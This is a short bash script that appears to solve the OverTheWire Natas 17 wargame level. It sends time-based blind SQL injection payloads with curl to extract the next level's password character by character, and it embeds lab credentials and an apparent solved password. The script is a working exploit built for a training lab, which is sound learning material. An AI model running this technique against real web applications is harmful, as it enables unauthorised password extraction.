#! /bin/bash
#xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP
url='http://natas17.natas.labs.overthewire.org'
user='natas17:8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw'
dataPart1='username=natas18" and if(password like binary "'
dataPart2='", sleep(2), null)#'
passwd=''

alphabet="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
passwdChars=""

#for i in $(seq 1 ${#alphabet})
#  do
#   char="${alphabet:i-1:1}"
#   data="$dataPart1""%$char%""$dataPart2"  
#   result=$(( /usr/bin/time -f "%E" curl -s -u "$user" "$url" --data "$data" > /dev/null; ) 2>&1)
#   result=$(echo "$result" | sed 's/.*:.\(.\).*/\1/')
##if time execution between 1 and 2 secs 
#   if [[ $result > 0 ]]
#      then passwdChars+="$char"
#	   echo "$i: $passwdChars"
#   fi
#  done

passwdChars="dghjlmpqsvwxyCDFIKOPR047"

for ((i=0;i<32;i++))
do
 for j in $(seq 1 ${#passwdChars})
  do
   char="${passwdChars:j-1:1}"
   data="$dataPart1""$passwd""$char""%""$dataPart2"  
   result=$(( /usr/bin/time -f "%E" curl -s -u "$user" "$url" --data "$data" > /dev/null; ) 2>&1 )
   result=$(echo "$result" | sed 's/.*:.\(.\).*/\1/')
#if time execution greater than 1 secs 
   if [[ $result > 0 ]]
      then passwd+="$char"
	   break
   fi


  done
echo "Current situation: ""$passwd"
done
